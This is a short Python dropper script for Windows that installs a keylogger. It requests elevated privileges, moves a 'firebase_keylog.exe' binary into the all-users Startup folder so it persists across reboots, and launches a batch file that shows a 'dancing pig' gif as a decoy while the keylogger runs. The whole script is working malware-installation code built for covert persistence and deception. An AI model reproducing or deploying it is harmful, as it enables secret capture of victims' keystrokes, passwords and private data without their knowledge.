import os
import sys
import win32com.shell.shell as shell
import shutil
import ctypes
import getpass
import subprocess

# instructions to ask for admin privileges were taken from this website: 
# https://stackoverflow.com/questions/41851413/ask-for-admin-access-for-a-python-function-in-windows#42787309

path = os.path.dirname(os.path.abspath(__file__))

# if the user is not admin, ask for admin privileges
if not ctypes.windll.shell32.IsUserAnAdmin():
    print('Not enough privilege, restarting...')
    #ctypes.windll.shell32.ShellExecuteW(
    #    None, 'runas', sys.executable, ' '.join(sys.argv), None, None)
    ctypes.windll.shell32.ShellExecuteW(None, u"runas", sys.executable,
                                        ' '.join(sys.argv), None, 1)
    sys.exit(0)
else:
    print('Elevated privilege acquired')
    print('Enjoy your dancing pig!')

# instructions for using shutil were taken from this website: https://www.geeksforgeeks.org/how-to-move-files-and-directories-in-python/
# move the exe file of the keylog into the startup folder
src = path + "\\dist\\firebase_keylog.exe" # this assumes the exe is in dist folder which is in the current working directory
user = getpass.getuser()
dst = r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
shutil.move(src, dst)

# Then open the keylog batch file that runs the pig gif and the keylogger
src = path + "\\dist"
os.system(r"cd " + src + " & keylog.bat")
